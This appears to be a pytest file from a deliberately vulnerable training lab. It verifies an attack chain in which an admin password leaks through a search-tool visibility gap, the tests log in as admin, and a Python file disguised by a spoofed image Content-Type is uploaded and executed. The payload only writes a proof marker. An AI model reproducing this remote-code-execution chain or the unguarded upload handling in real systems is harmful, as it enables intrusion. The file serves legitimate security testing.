"""Verifies the Stage 6/7 chain: a misplaced *human* admin credential (not
a service token) sitting in the same internal-ticket space as the
catalog-sync-service token, reachable through the exact same
knowledge_base_search visibility gap as tests/test_rag_injection.py
already covers for that token -- and that using it (an ordinary /login,
then the already-existing admin ticket-screenshot upload feature) reaches
the same code-execution sink as the catalog-sync path
(tests/test_catalog_sync.py), independently.
"""
import io
import os

from app.config import config
from app.models.db import query_one
from app.tools.knowledge_base_search import knowledge_base_search

PROOF_MARKER = "shoplab_admin_session_rce_proof"


def test_knowledge_base_search_default_does_not_leak_admin_password(alice, admin_password):
    result = knowledge_base_search(query="site admin password reset")
    bodies = " ".join(r["body"] for r in result["results"])
    assert admin_password not in bodies


def test_knowledge_base_search_leaks_admin_password_when_allowed(alice, admin_password):
    result = knowledge_base_search(query="site admin password reset", allow_internal=True)
    titles = [r["title"] for r in result["results"]]
    bodies = " ".join(r["body"] for r in result["results"])
    assert any("INC-10485" in t or "admin" in t.lower() for t in titles)
    assert admin_password in bodies


def test_disclosed_password_actually_logs_in_as_admin(client, admin_password):
    """The credential is a real, currently-valid password for the 'admin'
    role account -- not a decoy -- via the ordinary, unmodified /login
    form (no vulnerability in the login path itself, same as Stage 1)."""
    resp = client.post("/login", data={"username": "admin", "password": admin_password})
    assert resp.status_code in (200, 302)
    row = query_one("SELECT role FROM users WHERE username = 'admin'")
    assert row["role"] == "admin"
    # confirm the session actually is authenticated as admin, not just that
    # the POST succeeded
    page = client.get("/admin/tickets")
    assert page.status_code == 200


def test_wrong_password_does_not_log_in_as_admin(client):
    resp = client.post("/login", data={"username": "admin", "password": "definitely-wrong"})
    page = client.get("/admin/tickets")
    assert page.status_code in (302, 403)


def test_admin_session_ticket_screenshot_upload_actually_executes(client, admin_password):
    """End-to-end proof of remote code execution via Path B: no filename
    gate at all on this route (unlike catalog_photos.py's '.jpg' substring
    check) -- only a spoofable Content-Type allowlist -- so the file can be
    named exactly 'plugin.py'.
    """
    # a customer ticket must exist for the screenshot route to accept (it
    # only operates on visibility='customer' tickets)
    client.post("/login", data={"username": "alice.customer", "password": "Customer123!"})
    ticket_resp = client.post("/api/tickets", json={"subject": "Help", "body": "please help"})
    assert ticket_resp.status_code == 201
    ticket_ref = ticket_resp.get_json()["ticket_ref"]
    ticket = query_one("SELECT id FROM tickets WHERE ticket_ref = ?", (ticket_ref,))

    client.post("/login", data={"username": "admin", "password": admin_password})

    payload = f"""
import os
os.environ['{PROOF_MARKER}'] = 'executed'
open(os.path.join(os.path.dirname(__file__), 'admin_session_rce_proof.txt'), 'w').write('code executed as this process')
"""
    resp = client.post(
        f"/api/admin/tickets/{ticket['id']}/screenshot",
        data={"file": (io.BytesIO(payload.encode()), "plugin.py", "image/jpeg")},
        content_type="multipart/form-data",
    )
    assert resp.status_code == 201, "a plain .py filename with an allowed Content-Type must be accepted"

    proof_path = os.path.join(config.UPLOAD_DIR, "admin_session_rce_proof.txt")
    assert os.path.exists(proof_path), "the smuggled .py file should have executed"
    assert os.environ.get(PROOF_MARKER) == "executed"

    os.remove(proof_path)
    del os.environ[PROOF_MARKER]
